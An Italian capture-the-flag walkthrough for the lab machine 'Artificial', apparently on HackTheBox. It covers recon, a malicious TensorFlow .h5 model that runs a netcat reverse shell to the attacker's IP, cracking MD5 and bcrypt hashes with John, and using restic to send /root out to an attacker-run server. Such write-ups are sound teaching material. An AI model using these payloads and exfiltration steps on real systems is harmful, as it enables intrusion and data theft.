# Macchina artificial

IP vittima: 10.10.11.74 
IP attacante: 10.10.14.6

## Recon

`sudo nmap -p- --open -vvv -n -Pn 10.10.11.74 -oG porte`
`nmap -sC -sV -p22,80 10.10.11.74 -oN servizi`

```bash
# Nmap 7.94SVN scan initiated Wed Oct 22 18:37:34 2025 as: nmap -sC -sV -p22,80 -oN servizi 10.10.11.74
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Artificial - AI Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 22 18:37:42 2025 -- 1 IP address (1 host up) scanned in 7.76 seconds
```

Porte: 22,80

## Porta 80

Probabilmente non si riesce a visitare la porta http 80 sul browser quindi aggiornare `/etc/hosts con: <IP MACCHINA> artificial.htb`
![](images\2025-10-22-23-14-56-image.png)

Creare un account e loggarsi, poi scaricare il Dockerfile

![](images\2025-10-22-23-15-41-image.png)Sfrutteremo questo exploit: https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Inserendo il nostro IP e la nostra porta di ascolto

Creare il Docker con il docker file scaricato dal sito:

```bash
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

Quando si avvia il container docker creato saremo in una shell bash:

- creare un file .py che contiene l'exploit (mettere il nostro ip e la porta)
- eseguire il file .py creato con python
- lo script lanciato creerà un file `exploit.h5`
- copiare il file exploit.h5 creato fuori dal docker ( `docker cp $(docker ps -l -q):/code/exploit.h5 ./` )

Ora dal sito uploadare il file `exploit.h5`

![](images\2025-10-22-23-17-52-image.png)mettersi in ascolto sulla porta 4444 ( `nc -nlvp 4444` ) e cliccare su `View Predictions` sul sito

![](images\2025-10-22-23-18-49-image.png)Siamo dentro con l'utente `app`
Vediamo che nella cartella /home ci sono due cartelle: app e gael che probabilmente è un utente che troviamo anche in /etc/passwd
![](images\2025-10-22-23-19-45-image.png)

## User gael

Con [[linpeas]]troviamo il file `/home/app/app/instance/users.db`
che possiamo esaminare:

![](images\2025-10-22-23-20-17-image.png)Questa chiave `c99175974b6e192936d97224638a34f8` è un hash MD5 che potrebbe essere la password dell'user gael

Creiamo un file `hash.txt` che contiene la hash di gael e proviamo a craccarla con [[johntheripper]]
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5`

![](images\2025-10-22-23-20-48-image.png)Troviamo la password: `mattp005numbertwo`

Con la password trovata possiamo entrare nell'utente gael con ssh `ssh gael@10.10.11.74`
Nella cartella `/home/gael` troviamo il file `user.txt` con la user flag

## Root

Con [[linpeas]]si trova il file `backrest_backup.tar.gz` nella cartella `/var/backups`
Scarichiamolo sul nostro pc e apriamolo ( `tar -xvf backrest_backup.tar.gz` )
Nella cartella `backrest/.config/backrest` troviamo il file `config.json`:

![](images\2025-10-22-23-21-39-image.png)Questa è una **password cifrata con bcrypt** Analizziamo i dettagli:

### Struttura del dato:

- **Identificatore**: `"backrest_root"`
- **Algoritmo**: `bcrypt` (indicato dal campo `passwordBcrypt`)
- **Formato**: Stringa codificata in Base64
  
  ### Cosa contiene esattamente:
  
  La stringa `"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"` è un hash bcrypt che include:
1. **Versione algoritmo** (`$2a$`)
2. **Costo computazionale** (work factor)
3. **Salt** (valore casuale)
4. **Hash della password** vero e proprio
   
   ### Contesto probabile:

`"backrest_root"` suggerisce che potrebbe essere una password per il tool di backup `backrest` che è una soluzione di backup accessibile via web basata su restic che utilizza la porta 9898 di localhost
Possiamo sfruttare questo exploit di restic: https://gtfobins.github.io/gtfobins/restic/ ma dovremo installare restic ( `apt install restic` ) e rest-server scaricandolo da qui https://github.com/restic/rest-server

Cracchiamola con [[johntheripper]]
`john hash2.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt`
Troviamo la password: `?:!@#$%^`

Nella macchina vittima lanciamo il comando `ss -tuln` 
Comando `ss`:

### Significato delle opzioni:

- **`-t`** (TCP) - Mostra le connessioni TCP  
- **`-u`** (UDP) - Mostra le connessioni UDP  
- **`-l`** (listening) - Mostra solo socket in ascolto
- **`-n`** (numeric) - Mostra numeri invece di risolvere nomi (più veloce)
  
  ### Cosa visualizza:
  
  Elenca **tutti i servizi in ascolto** sulla macchina con:
- **Protocollo** (TCP/UDP)    
- **Porta** in uso    
- **Indirizzo IP** di ascolto   
- **Stato** della connessione

Vediamo che la porta 9898 è utilizzata:
![](images\2025-10-22-23-22-29-image.png)

Sulla nostra macchina, con Il comando `ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898` creiamo un **tunnel SSH con port forwarding locale**. 

### Cosa succede esattamente:

1. **Sulla tua macchina locale**:    
   - SSH apre un socket in ascolto sulla **porta 9898**       
2. **Quando ti connetti alla tua porta 9898**:  
   - Il traffico viene **incapsulato** nella connessione SSH      
   - Viaggia cifrato fino al server `10.10.11.74`      
3. **Sul server remoto**:
   - SSH inoltra il traffico a `127.0.0.1:9898`     
   - (cioè a un servizio in esecuzione sul server stesso)

Con `localhost:9898` nel nostro browser entriamo nel servizio backrest sulla macchina vittima
![](images\2025-10-22-23-23-10-image.png)

Accediamo con Username: `backrest_root` e Password: `!@#$%^`
Dopo aver fatto l'accesso dovremo creare una nuova repo (+ Add Repo)

![](images\2025-10-22-23-23-38-image.png)mettendo un nome (repox), URI /opt e una password (123456)
![](images\2025-10-22-23-24-15-image.png)

Mettiamoci in ascolto sulla nostra macchina con 
`./rest-server --path /tmp/restic-data --listen :12345 --no-auth`

Poi sul sito selezioniamo la repo creata e clicchiamo su Run Command

![](images\2025-10-22-23-24-48-image.png)Poi inseriamo i seguenti comandi:
`-r rest:http://<NOSTRO IP>:12345/repox init`
`-r rest:http://<NOSTRO IP>:12345/repox backup /root`

Sulla nostra macchina inseriamo i comandi:
`restic -r /tmp/restic-data/repox snapshots`

![](images\2025-10-22-23-25-24-image.png)`restic -r /tmp/restic-data/repox restore f8118067 --target ./restore`   (f8118067 è l'ID della repo)

Poi con il comando `cat restore/root/root.txt` otteniamo la flag root
